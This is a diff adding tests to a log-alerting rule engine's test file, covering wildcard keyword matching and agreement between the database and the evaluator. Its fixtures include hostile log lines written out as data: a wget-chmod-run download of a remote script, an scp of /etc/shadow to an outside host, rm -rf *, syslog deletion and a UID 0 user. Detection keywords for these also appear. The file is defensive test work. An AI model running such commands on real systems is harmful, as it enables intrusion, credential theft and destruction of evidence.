@@ -10,7 +10,7 @@ from app.models import Alert, AlertEvent, Event
 from app.rules import evaluate
 from app.rules.engine import detect
 from app.rules.evaluators import merge_spans
-from app.rules.schema import RULE
+from app.rules.schema import RULE, keyword_parts
 
 T0 = datetime(2026, 9, 9, 3, 0, 0, tzinfo=UTC)
 ATTACKER = "203.0.113.45"
@@ -324,6 +324,45 @@ def test_keyword_alerts_are_grouped_by_the_chosen_field():
     assert [d.key for d in by_user] == ["bob", "eve"]
 
 
+# --- keyword: any text in between ------------------------------------------------------------
+
+FETCH = "COMMAND=/bin/sh -c wget http://198.51.100.9/a.sh -O /tmp/a; chmod +x /tmp/a; /tmp/a"
+
+
+@pytest.mark.parametrize(
+    ("keyword", "parts"),
+    [
+        ("plain text", ["plain text"]),
+        ("wget *; chmod +x", ["wget ", "; chmod +x"]),
+        ("*echo binary >>*", ["echo binary >>"]),
+        ("a**b", ["a", "b"]),
+        (r"rm \*", ["rm *"]),
+        (r"C:\\*\temp", ["C:\\", r"\temp"]),
+        ("ends with a backslash\\", ["ends with a backslash\\"]),
+        ("*", []),
+        ("", []),
+    ],
+)
+def test_keyword_parts(keyword, parts):
+    assert keyword_parts(keyword) == parts
+
+
+def test_asterisk_in_a_keyword_stands_for_any_text():
+    rule = keyword_rule(keywords=["wget *; chmod +x"])
+    [detection] = detect(rule, [line(FETCH)])
+    # The mark ends at the first place the keyword's ending occurs.
+    assert marked(detection, FETCH) == ["wget http://198.51.100.9/a.sh -O /tmp/a; chmod +x"]
+
+    assert detect(rule, [line("chmod +x /tmp/a; wget http://198.51.100.9/a.sh")]) == []
+    assert detect(rule, [line("wget http://198.51.100.9/a.sh")]) == []
+
+
+def test_escaped_asterisk_is_an_asterisk():
+    rule = keyword_rule(keywords=[r"rm -rf \*"])
+    assert len(detect(rule, [line("COMMAND=/bin/rm -rf *")])) == 1
+    assert detect(rule, [line("COMMAND=/bin/rm -rf /tmp/build")]) == []
+
+
 # --- evaluate: the alerts table --------------------------------------------------------------
 
 
@@ -467,6 +506,49 @@ def test_keywords_with_special_characters_match_literally_and_whatever_their_cas
     [alert] = alerts(session)
     assert session.scalars(select(AlertEvent.event_id)).all() == [1]
     assert alert.count == 1
+
+
+LINES = [
+    FETCH,
+    "COMMAND=/usr/bin/scp /etc/shadow eve@203.0.113.99:/tmp/",
+    "COMMAND=/usr/bin/scp /etc/hosts /tmp/",
+    "COMMAND=/bin/rm -rf *",
+    "COMMAND=/bin/rm -rf /tmp/build",
+    "COMMAND=/bin/rm /var/log/syslog",
+    "COMMAND=/bin/rm /var/log/syslog.7.gz",
+    "disk usage 100% on /dev/sda1 (was 10 percent)",
+    r"opened C:\Users\bob\temp_file",
+    "opened C:/Users/bob/tempXfile",
+    "new user: name=mallory, UID=0, GID=27, home=/root",
+    "new user: name=carol, UID=1004, GID=27, home=/home/carol",
+    "ÇÖZÜM: wget kuruldu; chmod +x verildi",
+]
+
+
+@pytest.mark.parametrize(
+    ("fields", "expected"),
+    [
+        ({"keywords": ["wget *; chmod +x"]}, [1, 13]),
+        ({"keywords": ["*wget *"]}, [1, 13]),
+        ({"keywords": [r"rm -rf \*"]}, [4]),
+        ({"keywords": ["rm /var/log/syslog", "mv *syslog"]}, [6, 7]),
+        ({"keywords": ["100%"]}, [8]),
+        ({"keywords": ["10%percent"]}, []),  # a percent sign is not "anything"
+        ({"keywords": ["temp_file"]}, [9]),  # nor is an underscore "any character"
+        ({"keywords": [r"C:\Users\\*\temp"]}, [9]),
+        ({"keywords": ["çözüm*CHMOD"]}, [13]),
+    ],
+)
+def test_database_and_evaluator_agree_on_which_lines_count(session, fields, expected):
+    """The database leaves lines out beforehand; that must not change which lines alert."""
+    events = [line(message, index, event_id=index) for index, message in enumerate(LINES, 1)]
+    rule = keyword_rule(cooldown_seconds=0, **fields)
+    assert [ids(detection) for detection in detect(rule, events)] == [[n] for n in expected]
+
+    store(session, *events)
+    evaluate(session, [rule])
+    found = session.scalars(select(AlertEvent.event_id).order_by(AlertEvent.event_id)).all()
+    assert found == expected
 
 
 def test_evidence_spans_are_stored_for_highlighting(session):
